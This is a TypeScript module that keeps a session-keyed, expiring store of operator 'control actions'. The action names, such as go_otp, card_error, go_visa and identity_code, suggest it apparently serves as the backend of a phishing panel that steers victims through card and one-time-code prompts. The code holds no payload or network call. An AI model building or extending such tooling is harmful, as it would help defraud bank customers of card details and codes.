export type ControlAction = 
  | "go_otp" | "go_otp2" | "go_otp3" | "card_error" 
  | "go_nomer" | "nomer_error" | "go_nomer_wait" | "go_nomer_otp"
  | "go_home" | "go_form" | "go_select" | "go_visa" | "go_atm"
  | "go_total" | "go_total2" | "go_waiting"
  | "identity_code" | "go_identity_check";

interface ControlEntry {
  action: ControlAction;
  code?: string;
  setAt: number;
}

const store = new Map<string, ControlEntry>();

const TTL_MS = 60 * 60 * 1000;

function cleanup() {
  const now = Date.now();
  for (const [key, entry] of store) {
    if (now - entry.setAt > TTL_MS) store.delete(key);
  }
}
setInterval(cleanup, 5 * 60 * 1000);

export function setControl(sessionId: string, action: ControlAction, code?: string): void {
  store.set(sessionId, { action, code, setAt: Date.now() });
}

export function getControl(sessionId: string): { action: ControlAction; code?: string } | null {
  const entry = store.get(sessionId);
  if (!entry) return null;
  if (Date.now() - entry.setAt > TTL_MS) {
    store.delete(sessionId);
    return null;
  }
  store.delete(sessionId);
  return { action: entry.action, code: entry.code };
}

export function peekControl(sessionId: string): { action: ControlAction; code?: string } | null {
  const entry = store.get(sessionId);
  if (!entry) return null;
  return { action: entry.action, code: entry.code };
}
